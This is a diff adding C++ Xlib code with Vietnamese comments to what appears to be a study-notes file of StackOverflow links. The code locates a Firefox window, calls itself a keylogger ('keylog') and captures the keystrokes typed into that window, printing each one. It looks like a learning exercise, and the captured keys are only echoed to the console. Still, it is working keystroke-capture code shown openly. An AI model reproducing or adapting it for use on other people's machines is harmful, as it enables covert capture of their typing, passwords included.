@@ -2,6 +2,117 @@ https://stackoverflow.com/questions/9364668/xlib-window-name-problems
 https://stackoverflow.com/questions/5299989/x11-xlib-h-not-found-in-ubuntu
 https://stackoverflow.com/questions/30156202/xlib-c-get-window-handle-sendevent
 
+--------------------------------------------------------------------------------
+Bai Lam
+#include <X11/X.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <iostream>
+#include <unistd.h>
+#include <string>
+using namespace std;
+
+string WINDOWS_FIREFOX = "Mozilla Firefox";
+
+Window *list (Display *disp, unsigned long *len) {
+    Atom prop = XInternAtom(disp,"_NET_CLIENT_LIST",False), type;
+    int form;
+    unsigned long remain;
+    unsigned char *list;
+
+    if (XGetWindowProperty(disp,XDefaultRootWindow(disp),prop,0,1024,False,AnyPropertyType,
+                &type,&form,len,&remain,&list) != Success) {
+        return 0;
+    }
+
+    return (Window*)list;
+}
+
+char *name (Display *disp, Window win) {
+    Atom prop = XInternAtom(disp,"WM_NAME",False), type;
+    int form;
+    unsigned long remain, len;
+    unsigned char *list;
+
+    if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
+                &type,&form,&len,&remain,&list) != Success) {
+        return NULL;
+    }
+    return (char*)list;
+}
+
+int main(int argc, char* argv[]){
+    // variable
+    int i;
+    unsigned long len;
+    XKeyEvent esend;
+    Display *disp = XOpenDisplay(NULL);
+    Window *listT;
+    Window firefoxWindows = -1; // cua so firefox
+    char *nameT;
+    // lay danh sach tat ca cac windows chuong trinh dang duoc bat
+    listT = (Window*)list(disp,&len);
+    // duyet tat ca cac windows dang duoc bat
+    for (i=0;i<(int)len;i++) {
+	// lay ten cua so
+	nameT = name(disp,listT[i]);
+	string nameTAsString(nameT);
+	// tim kiem cua so firefox
+	if (nameTAsString.find(WINDOWS_FIREFOX) != std::string::npos) {
+	  // neu tim thay
+	  firefoxWindows = listT[i];
+	}
+	//free(nameT);
+    }
+    // kiem tra lay cua so firefox
+    if (firefoxWindows != -1) {
+	// keylog -- ham xu ly chinh
+	char buf[17];// lay ky tu duoc nhap tu ban phim
+	KeySym ks;
+	XComposeStatus comp;
+	int len;
+	int revert;
+	Window root = DefaultRootWindow(disp);
+	XGetInputFocus (disp, &firefoxWindows, &revert);
+    	XSelectInput(disp, firefoxWindows, KeyPressMask|KeyReleaseMask|FocusChangeMask);
+	// xu ly chinh
+	while (1) {
+	XEvent ev;
+	XNextEvent(disp, &ev);
+	switch (ev.type) {
+	    case FocusOut: {
+		cout << "Focus changed!" << endl;
+		cout << "Old focus is " << (int)firefoxWindows << endl;
+		if (firefoxWindows != root)
+		    XSelectInput(disp, firefoxWindows, 0);
+		XGetInputFocus (disp, &firefoxWindows, &revert);
+		cout << "New focus is " << (int)firefoxWindows << endl;
+		if (firefoxWindows == PointerRoot) {
+		    firefoxWindows = root;
+		}
+		XSelectInput(disp, firefoxWindows, KeyPressMask|KeyReleaseMask|FocusChangeMask);
+		break;
+	    }
+	    case KeyPress: {
+		cout << "Got key!" << endl;
+		len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
+		if (len > 0 && isprint(buf[0])) {
+		    buf[len]=0;
+		    cout << "Stirng is: " << buf << endl;
+		}
+		else {
+		    cout << "Key is: " << (int)ks << endl;
+		}
+	    }
+	}
+	}
+    } else {
+    	cout << "Not found!" << endl;
+    }
+    
+}
+--------------------------------------------------------------------------------
+Tham khao 1
 #include <X11/Xlib.h>
 #include <stdio.h>
 #include <unistd.h>
